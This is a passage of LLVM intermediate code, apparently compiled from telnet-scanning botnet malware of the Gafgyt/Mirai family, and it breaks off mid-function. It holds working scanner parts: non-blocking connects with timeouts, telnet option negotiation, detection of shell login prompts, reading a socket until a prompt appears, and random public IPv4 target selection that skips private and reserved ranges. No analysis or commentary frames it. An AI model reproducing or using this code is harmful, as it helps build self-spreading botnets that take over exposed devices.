  %.1.sink.ph = phi i8* [ %.01923, %.lr.ph ], [ %27, %29 ], [ %27, %25 ]
  %.020.ph = phi i32 [ -1, %.lr.ph ], [ %30, %29 ], [ %.024, %25 ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.1.sink = phi i8* [ %1, %3 ], [ %.1.sink.ph, %._crit_edge.loopexit ]
  %.020 = phi i32 [ 0, %3 ], [ %.020.ph, %._crit_edge.loopexit ]
  store i8 0, i8* %.1.sink, align 1
  ret i32 %.020
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) local_unnamed_addr #4

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %11 = sext i32 %10 to i64
  %12 = or i64 %11, 2048
  %13 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %12) #3
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = trunc i32 %2 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #18
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %19 = call i32 @getHost(i8* %1, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %0, %struct.sockaddr* nonnull %24, i32 16) #3
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %21
  %28 = tail call i32* @__errno_location() #18
  %29 = load i32, i32* %28, align 4
  %30 = icmp eq i32 %29, 115
  br i1 %30, label %31, label %58

; <label>:31:                                     ; preds = %27
  %32 = sext i32 %3 to i64
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  store i64 %32, i64* %33, align 8
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  store i64 0, i64* %34, align 8
  %35 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 0
  %36 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %35) #3, !srcloc !14
  %37 = srem i32 %0, 64
  %38 = zext i32 %37 to i64
  %39 = shl i64 1, %38
  %40 = sdiv i32 %0, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %39
  store i64 %44, i64* %42, align 8
  %45 = add nsw i32 %0, 1
  %46 = call i32 @select(i32 %45, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %6, %struct.__sigset_t* null, %struct.timeval* nonnull %7) #3
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %58

; <label>:48:                                     ; preds = %31
  store i32 4, i32* %8, align 4
  %49 = bitcast i32* %9 to i8*
  %50 = call i32 @getsockopt(i32 %0, i32 1, i32 4, i8* nonnull %49, i32* nonnull %8) #3
  %51 = load i32, i32* %9, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %58

; <label>:53:                                     ; preds = %48, %21
  %54 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %55 = sext i32 %54 to i64
  %56 = and i64 %55, -2049
  %57 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %56) #3
  br label %58

; <label>:58:                                     ; preds = %27, %31, %48, %4, %53
  %.0 = phi i32 [ 1, %53 ], [ 0, %4 ], [ 0, %48 ], [ 0, %31 ], [ 0, %27 ]
  ret i32 %.0
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #9

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #3
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %21, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i64, i64* @numpids, align 8
  %5 = add i64 %4, 1
  store i64 %5, i64* @numpids, align 8
  %6 = shl i64 %4, 2
  %7 = add i64 %6, 8
  %8 = tail call noalias i8* @malloc(i64 %7) #3
  %9 = bitcast i8* %8 to i32*
  %10 = icmp eq i64 %4, 0
  br i1 %10, label %.._crit_edge_crit_edge, label %.lr.ph.preheader

.._crit_edge_crit_edge:                           ; preds = %3
  %.pre14 = load i8*, i8** bitcast (i32** @pids to i8**), align 8
  br label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  %.pre = load i32*, i32** @pids, align 8
  %11 = bitcast i32* %.pre to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %12 = phi i64 [ %17, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i32 [ %16, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %13 = getelementptr inbounds i32, i32* %.pre, i64 %12
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds i32, i32* %9, i64 %12
  store i32 %14, i32* %15, align 4
  %16 = add i32 %.012, 1
  %17 = zext i32 %16 to i64
  %18 = icmp ult i64 %17, %4
  br i1 %18, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.._crit_edge_crit_edge
  %19 = phi i8* [ %.pre14, %.._crit_edge_crit_edge ], [ %11, %._crit_edge.loopexit ]
  %.lcssa = phi i64 [ 0, %.._crit_edge_crit_edge ], [ %4, %._crit_edge.loopexit ]
  %20 = getelementptr inbounds i32, i32* %9, i64 %.lcssa
  store i32 %1, i32* %20, align 4
  tail call void @free(i8* %19) #3
  store i8* %8, i8** bitcast (i32** @pids to i8**), align 8
  br label %21

; <label>:21:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) local_unnamed_addr #1 {
  %4 = alloca i8, align 1
  %5 = getelementptr inbounds i8, i8* %1, i64 1
  %6 = load i8, i8* %5, align 1
  %.off = add i8 %6, 5
  %switch = icmp ult i8 %.off, 4
  br i1 %switch, label %7, label %20

; <label>:7:                                      ; preds = %3
  store i8 -1, i8* %4, align 1
  %8 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #3
  %9 = load i8, i8* %5, align 1
  switch i8 %9, label %13 [
    i8 -4, label %10
    i8 -2, label %11
    i8 3, label %12
  ]

; <label>:10:                                     ; preds = %7
  store i8 -2, i8* %4, align 1
  br label %16

; <label>:11:                                     ; preds = %7
  store i8 -4, i8* %4, align 1
  br label %16

; <label>:12:                                     ; preds = %7
  store i8 -3, i8* %4, align 1
  br label %16

; <label>:13:                                     ; preds = %7
  %14 = icmp eq i8 %9, -3
  %15 = select i1 %14, i8 -4, i8 -2
  store i8 %15, i8* %4, align 1
  br label %16

; <label>:16:                                     ; preds = %11, %13, %12, %10
  %17 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #3
  %18 = getelementptr inbounds i8, i8* %1, i64 2
  %19 = call i64 @send(i32 %0, i8* %18, i64 1, i32 16384) #3
  br label %20

; <label>:20:                                     ; preds = %3, %16
  ret i32 0
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @matchPrompt(i8* nocapture readonly) local_unnamed_addr #11 {
.preheader:
  %1 = tail call i64 @strlen(i8* %0) #15
  %2 = trunc i64 %1 to i32
  %sext = shl i64 %1, 32
  %3 = ashr exact i64 %sext, 32
  %4 = getelementptr inbounds i8, i8* %0, i64 %3
  %sext41 = shl i64 %1, 32
  %5 = ashr exact i64 %sext41, 32
  %6 = icmp sgt i32 %2, 0
  br i1 %6, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.preheader.137:                                   ; preds = %.critedge
  %7 = icmp sgt i32 %2, %.1.lcssa
  br i1 %7, label %.lr.ph.1.preheader, label %.critedge.1

.lr.ph.1.preheader:                               ; preds = %.preheader.137
  br label %.lr.ph.1

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.critedge1
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %.130 = phi i32 [ %12, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %8 = sub nsw i64 0, %indvars.iv
  %9 = getelementptr inbounds i8, i8* %4, i64 %8
  %10 = load i8, i8* %9, align 1
  %11 = trunc i64 %indvars.iv to i32
  switch i8 %10, label %.critedge.loopexit [
    i8 0, label %.critedge1
    i8 32, label %.critedge1
    i8 13, label %.critedge1
    i8 10, label %.critedge1
  ]

.critedge1:                                       ; preds = %.lr.ph, %.lr.ph, %.lr.ph, %.lr.ph
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %12 = add nsw i32 %.130, 1
  %13 = icmp sgt i64 %5, %indvars.iv.next
  br i1 %13, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %.critedge1
  %.1.lcssa.ph = phi i32 [ %11, %.lr.ph ], [ %12, %.critedge1 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.1.lcssa = phi i32 [ 0, %.preheader ], [ %.1.lcssa.ph, %.critedge.loopexit ]
  %14 = sext i32 %.1.lcssa to i64
  %15 = sub nsw i64 0, %14
  %16 = getelementptr inbounds i8, i8* %4, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = icmp eq i8 %17, 58
  br i1 %18, label %19, label %.preheader.137

; <label>:19:                                     ; preds = %.critedge.3, %.critedge.2, %.critedge.1, %.critedge
  ret i32 1

.lr.ph.1:                                         ; preds = %.lr.ph.1.preheader, %.critedge1.1
  %indvars.iv.1 = phi i64 [ %indvars.iv.next.1, %.critedge1.1 ], [ %14, %.lr.ph.1.preheader ]
  %.130.1 = phi i32 [ %24, %.critedge1.1 ], [ %.1.lcssa, %.lr.ph.1.preheader ]
  %20 = sub nsw i64 0, %indvars.iv.1
  %21 = getelementptr inbounds i8, i8* %4, i64 %20
  %22 = load i8, i8* %21, align 1
  %23 = trunc i64 %indvars.iv.1 to i32
  switch i8 %22, label %.critedge.1.loopexit [
    i8 0, label %.critedge1.1
    i8 32, label %.critedge1.1
    i8 13, label %.critedge1.1
    i8 10, label %.critedge1.1
  ]

.critedge1.1:                                     ; preds = %.lr.ph.1, %.lr.ph.1, %.lr.ph.1, %.lr.ph.1
  %indvars.iv.next.1 = add nsw i64 %indvars.iv.1, 1
  %24 = add nsw i32 %.130.1, 1
  %25 = icmp sgt i64 %5, %indvars.iv.next.1
  br i1 %25, label %.lr.ph.1, label %.critedge.1.loopexit

.critedge.1.loopexit:                             ; preds = %.critedge1.1, %.lr.ph.1
  %.1.lcssa.1.ph = phi i32 [ %23, %.lr.ph.1 ], [ %24, %.critedge1.1 ]
  br label %.critedge.1

.critedge.1:                                      ; preds = %.critedge.1.loopexit, %.preheader.137
  %.1.lcssa.1 = phi i32 [ %.1.lcssa, %.preheader.137 ], [ %.1.lcssa.1.ph, %.critedge.1.loopexit ]
  %26 = sext i32 %.1.lcssa.1 to i64
  %27 = sub nsw i64 0, %26
  %28 = getelementptr inbounds i8, i8* %4, i64 %27
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 62
  br i1 %30, label %19, label %.preheader.238

.preheader.238:                                   ; preds = %.critedge.1
  %31 = icmp sgt i32 %2, %.1.lcssa.1
  br i1 %31, label %.lr.ph.2.preheader, label %.critedge.2

.lr.ph.2.preheader:                               ; preds = %.preheader.238
  br label %.lr.ph.2

.lr.ph.2:                                         ; preds = %.lr.ph.2.preheader, %.critedge1.2
  %indvars.iv.2 = phi i64 [ %indvars.iv.next.2, %.critedge1.2 ], [ %26, %.lr.ph.2.preheader ]
  %.130.2 = phi i32 [ %36, %.critedge1.2 ], [ %.1.lcssa.1, %.lr.ph.2.preheader ]
  %32 = sub nsw i64 0, %indvars.iv.2
  %33 = getelementptr inbounds i8, i8* %4, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = trunc i64 %indvars.iv.2 to i32
  switch i8 %34, label %.critedge.2.loopexit [
    i8 0, label %.critedge1.2
    i8 32, label %.critedge1.2
    i8 13, label %.critedge1.2
    i8 10, label %.critedge1.2
  ]

.critedge1.2:                                     ; preds = %.lr.ph.2, %.lr.ph.2, %.lr.ph.2, %.lr.ph.2
  %indvars.iv.next.2 = add nsw i64 %indvars.iv.2, 1
  %36 = add nsw i32 %.130.2, 1
  %37 = icmp sgt i64 %5, %indvars.iv.next.2
  br i1 %37, label %.lr.ph.2, label %.critedge.2.loopexit

.critedge.2.loopexit:                             ; preds = %.critedge1.2, %.lr.ph.2
  %.1.lcssa.2.ph = phi i32 [ %35, %.lr.ph.2 ], [ %36, %.critedge1.2 ]
  br label %.critedge.2

.critedge.2:                                      ; preds = %.critedge.2.loopexit, %.preheader.238
  %.1.lcssa.2 = phi i32 [ %.1.lcssa.1, %.preheader.238 ], [ %.1.lcssa.2.ph, %.critedge.2.loopexit ]
  %38 = sext i32 %.1.lcssa.2 to i64
  %39 = sub nsw i64 0, %38
  %40 = getelementptr inbounds i8, i8* %4, i64 %39
  %41 = load i8, i8* %40, align 1
  %42 = icmp eq i8 %41, 37
  br i1 %42, label %19, label %.preheader.339

.preheader.339:                                   ; preds = %.critedge.2
  %43 = icmp sgt i32 %2, %.1.lcssa.2
  br i1 %43, label %.lr.ph.3.preheader, label %.critedge.3

.lr.ph.3.preheader:                               ; preds = %.preheader.339
  br label %.lr.ph.3

.lr.ph.3:                                         ; preds = %.lr.ph.3.preheader, %.critedge1.3
  %indvars.iv.3 = phi i64 [ %indvars.iv.next.3, %.critedge1.3 ], [ %38, %.lr.ph.3.preheader ]
  %.130.3 = phi i32 [ %48, %.critedge1.3 ], [ %.1.lcssa.2, %.lr.ph.3.preheader ]
  %44 = sub nsw i64 0, %indvars.iv.3
  %45 = getelementptr inbounds i8, i8* %4, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = trunc i64 %indvars.iv.3 to i32
  switch i8 %46, label %.critedge.3.loopexit [
    i8 0, label %.critedge1.3
    i8 32, label %.critedge1.3
    i8 13, label %.critedge1.3
    i8 10, label %.critedge1.3
  ]

.critedge1.3:                                     ; preds = %.lr.ph.3, %.lr.ph.3, %.lr.ph.3, %.lr.ph.3
  %indvars.iv.next.3 = add nsw i64 %indvars.iv.3, 1
  %48 = add nsw i32 %.130.3, 1
  %49 = icmp sgt i64 %5, %indvars.iv.next.3
  br i1 %49, label %.lr.ph.3, label %.critedge.3.loopexit

.critedge.3.loopexit:                             ; preds = %.critedge1.3, %.lr.ph.3
  %.1.lcssa.3.ph = phi i32 [ %47, %.lr.ph.3 ], [ %48, %.critedge1.3 ]
  br label %.critedge.3

.critedge.3:                                      ; preds = %.critedge.3.loopexit, %.preheader.339
  %.1.lcssa.3 = phi i32 [ %.1.lcssa.2, %.preheader.339 ], [ %.1.lcssa.3.ph, %.critedge.3.loopexit ]
  %50 = sext i32 %.1.lcssa.3 to i64
  %51 = sub nsw i64 0, %50
  %52 = getelementptr inbounds i8, i8* %4, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = icmp eq i8 %53, 36
  br i1 %54, label %19, label %.preheader.440

.preheader.440:                                   ; preds = %.critedge.3
  %55 = icmp sgt i32 %2, %.1.lcssa.3
  br i1 %55, label %.lr.ph.4.preheader, label %.critedge.4

.lr.ph.4.preheader:                               ; preds = %.preheader.440
  br label %.lr.ph.4

.lr.ph.4:                                         ; preds = %.lr.ph.4.preheader, %.critedge1.4
  %indvars.iv.4 = phi i64 [ %indvars.iv.next.4, %.critedge1.4 ], [ %50, %.lr.ph.4.preheader ]
  %.130.4 = phi i32 [ %60, %.critedge1.4 ], [ %.1.lcssa.3, %.lr.ph.4.preheader ]
  %56 = sub nsw i64 0, %indvars.iv.4
  %57 = getelementptr inbounds i8, i8* %4, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = trunc i64 %indvars.iv.4 to i32
  switch i8 %58, label %.critedge.4.loopexit [
    i8 0, label %.critedge1.4
    i8 32, label %.critedge1.4
    i8 13, label %.critedge1.4
    i8 10, label %.critedge1.4
  ]

.critedge1.4:                                     ; preds = %.lr.ph.4, %.lr.ph.4, %.lr.ph.4, %.lr.ph.4
  %indvars.iv.next.4 = add nsw i64 %indvars.iv.4, 1
  %60 = add nsw i32 %.130.4, 1
  %61 = icmp sgt i64 %5, %indvars.iv.next.4
  br i1 %61, label %.lr.ph.4, label %.critedge.4.loopexit

.critedge.4.loopexit:                             ; preds = %.critedge1.4, %.lr.ph.4
  %.1.lcssa.4.ph = phi i32 [ %59, %.lr.ph.4 ], [ %60, %.critedge1.4 ]
  br label %.critedge.4

.critedge.4:                                      ; preds = %.critedge.4.loopexit, %.preheader.440
  %.1.lcssa.4 = phi i32 [ %.1.lcssa.3, %.preheader.440 ], [ %.1.lcssa.4.ph, %.critedge.4.loopexit ]
  %62 = sext i32 %.1.lcssa.4 to i64
  %63 = sub nsw i64 0, %62
  %64 = getelementptr inbounds i8, i8* %4, i64 %63
  %65 = load i8, i8* %64, align 1
  %66 = icmp eq i8 %65, 35
  %. = zext i1 %66 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8* nocapture readonly, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %9 = alloca %struct.__sigset_t, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = sext i32 %3 to i64
  %12 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 0
  store i64 %11, i64* %12, align 8
  %13 = sext i32 %4 to i64
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i64 0, i32 1
  store i64 %13, i64* %14, align 8
  %15 = add nsw i32 %7, 2
  %16 = icmp slt i32 %15, %6
  br i1 %16, label %.lr.ph, label %.critedge

.lr.ph:                                           ; preds = %8
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 0
  %18 = srem i32 %0, 64
  %19 = zext i32 %18 to i64
  %20 = shl i64 1, %19
  %21 = sdiv i32 %0, 64
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %9, i64 0, i32 0, i64 %22
  %24 = add nsw i32 %0, 1
  %25 = icmp eq i32 %2, 0
  %26 = icmp sgt i32 %3, 0
  %27 = icmp sgt i32 %4, 0
  %28 = or i1 %26, %27
  br i1 %25, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br i1 %28, label %.lr.ph77.preheader, label %.critedge

.lr.ph77.preheader:                               ; preds = %.lr.ph.split.preheader
  br label %.lr.ph77

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br i1 %28, label %.lr.ph67.preheader, label %.critedge

.lr.ph67.preheader:                               ; preds = %.lr.ph.split.us.preheader
  br label %.lr.ph67

.lr.ph67:                                         ; preds = %.lr.ph67.preheader, %.backedge.us..lr.ph.split.us_crit_edge
  %.03335.us66 = phi i32 [ %40, %.backedge.us..lr.ph.split.us_crit_edge ], [ %7, %.lr.ph67.preheader ]
  %29 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %17) #3, !srcloc !15
  %30 = load i64, i64* %23, align 8
  %31 = or i64 %30, %20
  store i64 %31, i64* %23, align 8
  %32 = call i32 @select(i32 %24, %struct.__sigset_t* nonnull %9, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* nonnull %10) #3
  %33 = icmp slt i32 %32, 1
  br i1 %33, label %.critedge.loopexit, label %34

; <label>:34:                                     ; preds = %.lr.ph67
  %35 = sext i32 %.03335.us66 to i64
  %36 = getelementptr inbounds i8, i8* %5, i64 %35
  %37 = call i64 @recv(i32 %0, i8* %36, i64 1, i32 0) #3
  %38 = trunc i64 %37 to i32
  switch i32 %38, label %39 [
    i32 -1, label %.critedge.loopexit
    i32 0, label %.critedge.loopexit
  ]

; <label>:39:                                     ; preds = %34
  %40 = add nsw i32 %38, %.03335.us66
  %41 = load i8, i8* %36, align 1
  %42 = icmp eq i8 %41, -1
  br i1 %42, label %.us-lcssa.us.loopexit, label %43

; <label>:43:                                     ; preds = %39
  %44 = call i8* @strstr(i8* nonnull %5, i8* %1) #15
  %45 = icmp eq i8* %44, null
  br i1 %45, label %.backedge.us, label %.critedge.loopexit

.backedge.us:                                     ; preds = %43
  %46 = add nsw i32 %40, 2
  %47 = icmp slt i32 %46, %6
  br i1 %47, label %.backedge.us..lr.ph.split.us_crit_edge, label %.critedge.loopexit

.backedge.us..lr.ph.split.us_crit_edge:           ; preds = %.backedge.us
  %.pre54 = load i64, i64* %12, align 8
  %.pre55 = load i64, i64* %14, align 8
  %48 = icmp sgt i64 %.pre54, 0
  %49 = icmp sgt i64 %.pre55, 0
  %50 = or i1 %48, %49
  br i1 %50, label %.lr.ph67, label %.critedge.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.backedge..lr.ph.split_crit_edge
  %.0333576 = phi i32 [ %62, %.backedge..lr.ph.split_crit_edge ], [ %7, %.lr.ph77.preheader ]
  %51 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %17) #3, !srcloc !15
  %52 = load i64, i64* %23, align 8
  %53 = or i64 %52, %20
  store i64 %53, i64* %23, align 8
  %54 = call i32 @select(i32 %24, %struct.__sigset_t* nonnull %9, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* nonnull %10) #3
  %55 = icmp slt i32 %54, 1
  br i1 %55, label %.critedge.loopexit89, label %56

; <label>:56:                                     ; preds = %.lr.ph77
  %57 = sext i32 %.0333576 to i64
  %58 = getelementptr inbounds i8, i8* %5, i64 %57
  %59 = call i64 @recv(i32 %0, i8* %58, i64 1, i32 0) #3
  %60 = trunc i64 %59 to i32
  switch i32 %60, label %61 [
    i32 -1, label %.critedge.loopexit89
    i32 0, label %.critedge.loopexit89
  ]

; <label>:61:                                     ; preds = %56
  %62 = add nsw i32 %60, %.0333576
  %63 = load i8, i8* %58, align 1
  %64 = icmp eq i8 %63, -1
  br i1 %64, label %.us-lcssa.us.loopexit91, label %70

.us-lcssa.us.loopexit:                            ; preds = %39
  br label %.us-lcssa.us

.us-lcssa.us.loopexit91:                          ; preds = %61
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit91, %.us-lcssa.us.loopexit
  %.lcssa = phi i8* [ %36, %.us-lcssa.us.loopexit ], [ %58, %.us-lcssa.us.loopexit91 ]
  %65 = getelementptr inbounds i8, i8* %.lcssa, i64 1
  %66 = call i64 @recv(i32 %0, i8* %65, i64 2, i32 0) #3
  %67 = trunc i64 %66 to i32
  switch i32 %67, label %68 [
    i32 -1, label %.critedge
    i32 0, label %.critedge
  ]

; <label>:68:                                     ; preds = %.us-lcssa.us
  %69 = call i32 @negotiate(i32 %0, i8* nonnull %.lcssa, i32 undef)
  br label %.critedge

; <label>:70:                                     ; preds = %61
  %71 = call i8* @strstr(i8* nonnull %5, i8* %1) #15
  %72 = icmp eq i8* %71, null
  br i1 %72, label %78, label %.critedge.loopexit89

.backedge:                                        ; preds = %78
  %73 = add nsw i32 %62, 2
  %74 = icmp slt i32 %73, %6
  br i1 %74, label %.backedge..lr.ph.split_crit_edge, label %.critedge.loopexit89

.backedge..lr.ph.split_crit_edge:                 ; preds = %.backedge
  %.pre = load i64, i64* %12, align 8
  %.pre53 = load i64, i64* %14, align 8
  %75 = icmp sgt i64 %.pre, 0
  %76 = icmp sgt i64 %.pre53, 0
  %77 = or i1 %75, %76
  br i1 %77, label %.lr.ph77, label %.critedge.loopexit89

; <label>:78:                                     ; preds = %70
  %79 = call i32 @matchPrompt(i8* nonnull %5)
  %80 = icmp eq i32 %79, 0
  br i1 %80, label %.backedge, label %.critedge.loopexit89

.critedge.loopexit:                               ; preds = %34, %34, %43, %.lr.ph67, %.backedge.us..lr.ph.split.us_crit_edge, %.backedge.us
  %.0.ph = phi i32 [ 0, %34 ], [ 0, %34 ], [ 1, %43 ], [ 0, %.lr.ph67 ], [ 0, %.backedge.us..lr.ph.split.us_crit_edge ], [ 0, %.backedge.us ]
  br label %.critedge

.critedge.loopexit89:                             ; preds = %56, %56, %70, %78, %.lr.ph77, %.backedge..lr.ph.split_crit_edge, %.backedge
  %.0.ph90 = phi i32 [ 0, %56 ], [ 0, %56 ], [ 1, %70 ], [ 1, %78 ], [ 0, %.lr.ph77 ], [ 0, %.backedge..lr.ph.split_crit_edge ], [ 0, %.backedge ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit89, %.critedge.loopexit, %.lr.ph.split.preheader, %.lr.ph.split.us.preheader, %8, %.us-lcssa.us, %.us-lcssa.us, %68
  %.0 = phi i32 [ 0, %68 ], [ 0, %.us-lcssa.us ], [ 0, %.us-lcssa.us ], [ 0, %8 ], [ 0, %.lr.ph.split.us.preheader ], [ 0, %.lr.ph.split.preheader ], [ %.0.ph, %.critedge.loopexit ], [ %.0.ph90, %.critedge.loopexit89 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() local_unnamed_addr #1 {
  %1 = alloca [16 x i8], align 16
  br label %.critedge

.critedge:                                        ; preds = %.critedge.backedge, %0
  %2 = tail call i32 @rand() #3
  %3 = tail call i32 @rand() #3
  %4 = srem i32 %3, 255
  %5 = tail call i32 @rand() #3
  %6 = srem i32 %5, 255
  %7 = tail call i32 @rand() #3
  %8 = srem i32 %7, 255
  %9 = and i32 %4, 255
  %trunc = trunc i32 %4 to i8
  switch i8 %trunc, label %.thread87 [
    i8 0, label %.critedge.backedge
    i8 10, label %.critedge.backedge
    i8 100, label %10
    i8 127, label %.critedge.backedge
    i8 -87, label %13
    i8 -84, label %14
  ]

; <label>:10:                                     ; preds = %.critedge
  %11 = and i32 %6, 192
  %12 = icmp eq i32 %11, 64
  br i1 %12, label %.critedge.backedge, label %.thread87

; <label>:13:                                     ; preds = %.critedge
  %.old = and i32 %6, 255
  %.old51 = icmp eq i32 %.old, 254
  br i1 %.old51, label %.critedge.backedge, label %.thread87

.critedge.backedge:                               ; preds = %13, %10, %.critedge, %.critedge, %.critedge, %14, %.thread87, %20, %28, %.critedge71, %26
  br label %.critedge

; <label>:14:                                     ; preds = %.critedge
  %.old53 = and i32 %6, 255
  %.old54 = icmp ult i32 %.old53, 17
  br i1 %.old54, label %.critedge.backedge, label %.thread87

.thread87:                                        ; preds = %10, %13, %.critedge, %14
  %15 = icmp eq i32 %9, 192
  %16 = and i32 %6, 255
  %17 = icmp eq i32 %16, 0
  %or.cond58 = and i1 %15, %17
  %18 = and i32 %8, 255
  %19 = icmp eq i32 %18, 2
  %or.cond61 = and i1 %or.cond58, %19
  br i1 %or.cond61, label %.critedge.backedge, label %20

; <label>:20:                                     ; preds = %.thread87
  %21 = icmp eq i32 %16, 88
  %or.cond64 = and i1 %15, %21
  %22 = icmp eq i32 %18, 99
  %or.cond67 = and i1 %or.cond64, %22
  %23 = icmp eq i32 %16, 168
  %or.cond70 = and i1 %15, %23
  %or.cond90 = or i1 %or.cond70, %or.cond67
  br i1 %or.cond90, label %.critedge.backedge, label %24

; <label>:24:                                     ; preds = %20
  %25 = icmp eq i32 %9, 198
  br i1 %25, label %26, label %.critedge71

; <label>:26:                                     ; preds = %24
  %27 = and i32 %6, 254
  %switch = icmp eq i32 %27, 18
  br i1 %switch, label %.critedge.backedge, label %28

; <label>:28:                                     ; preds = %26
  %29 = icmp eq i32 %16, 51
  %30 = icmp eq i32 %18, 100
  %or.cond77 = and i1 %29, %30
  br i1 %or.cond77, label %.critedge.backedge, label %.critedge71

.critedge71:                                      ; preds = %24, %28
  %31 = icmp eq i32 %9, 203
  %or.cond80 = and i1 %31, %17
  %32 = icmp eq i32 %18, 113
  %or.cond83 = and i1 %or.cond80, %32
  %33 = icmp ugt i32 %9, 223
  %or.cond85 = or i1 %33, %or.cond83
  br i1 %or.cond85, label %.critedge.backedge, label %34

; <label>:34:                                     ; preds = %.critedge71
